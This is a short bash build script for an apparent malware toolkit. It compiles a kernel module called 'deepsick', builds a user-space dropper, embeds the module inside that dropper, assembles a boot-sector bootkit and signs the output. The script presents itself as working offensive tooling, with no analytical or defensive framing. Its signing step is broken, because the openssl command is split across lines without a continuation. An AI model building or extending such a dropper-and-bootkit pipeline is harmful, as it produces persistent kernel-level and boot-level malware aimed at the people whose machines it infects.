// placeholder
 #!/bin/bash

KERNEL_VERSION=$(uname -r)
 OUTPUT_DIR="build"
 MODULE_NAME="deepsick"

mkdir -p $OUTPUT_DIR/{kernel,user,bootkit}

# Build kernel module
 make -C src/kernel KERNELDIR=/lib/modules/$KERNEL_VERSION/build
 cp src/kernel/$MODULE_NAME.ko $OUTPUT_DIR/kernel/

# Build user dropper
 gcc -O2 -Wall -Wextra -fPIE -pie -o $OUTPUT_DIR/user/dropper src/user/dropper.c
 objcopy --add-section .module=$OUTPUT_DIR/kernel/$MODULE_NAME.ko $OUTPUT_DIR/user/dropper

# Build bootkit
 nasm -f bin -o $OUTPUT_DIR/bootkit/bootkit.bin src/bootkit/bootkit.asm

# Sign binaries
 openssl dgst -sha256 -sign keys/signing.key
 -out $OUTPUT_DIR/user/dropper.sig $OUTPUT_DIR/user/dropper

echo "[+] Build completed. Output in $OUTPUT_DIR/"
